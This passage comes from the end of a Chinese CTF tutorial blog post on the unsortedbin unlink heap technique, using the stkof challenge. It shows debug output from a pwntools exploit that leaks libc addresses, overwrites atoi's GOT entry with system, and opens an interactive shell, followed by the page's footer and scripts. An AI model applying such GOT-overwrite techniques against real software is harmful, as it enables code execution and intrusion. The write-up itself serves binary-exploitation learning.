class="string">[+] system address: 0x7f38a84e53a0</span></span><br><span class="line"><span class="string">[+] /bin/sh address: 0x7f38a862ce17</span></span><br><span class="line"><span class="string">[*] Changing atoi@got --&gt; system@got...</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">2</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x2 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span><span class="number">9</span>\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x9 bytes:</span></span><br><span class="line"><span class="string">    00000000  a0 53 4e a8  38 7f 00 00  0a                        │·SN·│8···│·│</span></span><br><span class="line"><span class="string">    00000009</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>OK\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[*] Now atoi@got is system@got, so just pass the string &#x27;</span>/bin/sh<span class="string">&#x27; to atoi</span></span><br><span class="line"><span class="string">[*] Actually we called system(&#x27;</span>/bin/sh<span class="string">&#x27;) !</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x8 bytes:</span></span><br><span class="line"><span class="string">    00000000  17 ce 62 a8  38 7f 00 00                            │··b·│8···│</span></span><br><span class="line"><span class="string">    00000008</span></span><br><span class="line"><span class="string">[*] Ready in 5 seconds...</span></span><br><span class="line"><span class="string">[+] PWN!!</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>ls\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x19 bytes:</span></span><br><span class="line"><span class="string">    00000000  73 68 3a 20  31 3a 20 17  ce 62 a8 38  7f 3a 20 6e  │sh: │1: ·│·b·8│·: n│</span></span><br><span class="line"><span class="string">    00000010  6f 74 20 66  6f 75 6e 64  0a                        │ot f│ound│·│</span></span><br><span class="line"><span class="string">    00000019</span></span><br><span class="line"><span class="string">sh: 1: \x17b\xa88\x7f: not found</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x1e bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>FAIL\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>sh: <span class="number">1</span>: s: not found\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &#x27;</span>FAIL\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">FAIL</span></span><br><span class="line"><span class="string">sh: 1: s: not found</span></span><br><span class="line"><span class="string">FAIL</span></span><br><span class="line"><span class="string">$ ls</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x3 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>ls\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x28 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>exp.py\tstkof  stkof_patch  test  test.c\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">exp.py    stkof  stkof_patch  test  test.c</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x5 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>FAIL\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">FAIL</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">[DEBUG] Sent 0x7 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>whoami\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x7 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>ubuntu\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">ubuntu</span></span><br><span class="line"><span class="string">[DEBUG] Received 0x5 bytes:</span></span><br><span class="line"><span class="string">    &#x27;</span>FAIL\n<span class="string">&#x27;</span></span><br><span class="line"><span class="string">FAIL</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://cyberangel.cn/2020/09/22/PWN%E5%85%A5%E9%97%A8%EF%BC%883-5-2%EF%BC%89-%20unsortedbin%E7%9A%84unlink%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/">https://cyberangel.cn/2020/09/22/PWN入门（3-5-2）- unsortedbin的unlink（例题）/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://cyberangel.cn" target="_blank">Cyberangel-blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button button--animated"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/09/29/PWN%E5%85%A5%E9%97%A8%EF%BC%883-7-1%EF%BC%89-fastbin_attack%E7%BB%BC%E8%BF%B0/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">PWN入门（3-7-1）-fastbin_attack综述</div></div></a></div><div class="next-post pull-right"><a href="/2020/09/22/PWN%E5%85%A5%E9%97%A8%EF%BC%883-5-1%EF%BC%89-%20unsortedbin%E7%9A%84unlink%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PWN入门（3-5-1）- unsortedbin的unlink（基础）</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%AF%B4%E6%98%8E%E5%8F%8A%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">题目说明及检查</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9-alarm-%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.</span> <span class="toc-text">修改 alarm 函数的参数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IDA-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">IDA 静态分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9-main-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">2.2.1.</span> <span class="toc-text">对 main 函数进行分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%AF%B9-create-a-heap-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">1、对 create_a_heap 函数进行分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%AF%B9-edit-a-heap-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">2.2.3.</span> <span class="toc-text">2、对 edit_a_heap 函数进行分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%AF%B9-delete-a-heap-%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90"><span class="toc-number">2.2.4.</span> <span class="toc-text">3、对 delete_a_heap 函数进行分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E5%AF%B9-Check-the-usage-of-the-heap-%E5%87%BD%E6%95%B0%E7%BB%A7%E7%BB%AD%E5%88%86%E6%9E%90"><span class="toc-number">2.2.5.</span> <span class="toc-text">4、对 Check_the_usage_of_the_heap 函数继续分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E5%88%86%E6%9E%90%E5%8F%8A%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">思路分析及动态调试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%A8%A1%E4%BB%BF%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B%E5%86%99%E5%87%BA-payload"><span class="toc-number">3.1.</span> <span class="toc-text">1、模仿程序流程写出 payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%88%9B%E5%BB%BA-3-%E4%B8%AA-chunk"><span class="toc-number">3.2.</span> <span class="toc-text">2、创建 3 个 chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA-fake-chunk"><span class="toc-number">3.3.</span> <span class="toc-text">3、创建一个 fake_chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.4.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81free-amp-chunk3-%E8%A7%A6%E5%8F%91-unlink"><span class="toc-number">3.5.</span> <span class="toc-text">4、free(&amp;chunk3)触发 unlink</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E6%B3%84%E9%9C%B2%E5%87%BD%E6%95%B0%E5%9C%B0%E5%9D%80"><span class="toc-number">3.6.</span> <span class="toc-text">5、泄露函数地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E6%9F%A5%E6%89%BE-system-%E5%87%BD%E6%95%B0%E5%92%8C-bin-sh-%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">3.7.</span> <span class="toc-text">6、查找 system()函数和&#x2F;bin&#x2F;sh 字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E6%8B%BF-shell%EF%BC%81"><span class="toc-number">3.8.</span> <span class="toc-text">7、拿 shell！</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp-%E8%AF%A6%E7%BB%86%E6%89%A7%E8%A1%8C%E4%BF%A1%E6%81%AF"><span class="toc-number">4.</span> <span class="toc-text">exp 详细执行信息</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By Cyberangel</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">为世界上所有美好而战！！！</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://cyberangel.cn/2020/09/22/PWN%E5%85%A5%E9%97%A8%EF%BC%883-5-2%EF%BC%89-%20unsortedbin%E7%9A%84unlink%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/'
    this.page.identifier = '2020/09/22/PWN入门（3-5-2）- unsortedbin的unlink（例题）/'
    this.page.title = 'PWN入门（3-5-2）- unsortedbin的unlink（例题）'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script><script>if (window.DISQUSWIDGETS === undefined) {
  var d = document, s = d.createElement('script');
  s.src = 'https://.disqus.com/count.js';
  s.id = 'dsq-count-scr';
  (d.head || d.body).appendChild(s);
} else {
  DISQUSWIDGETS.getCount({reset: true});
}</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>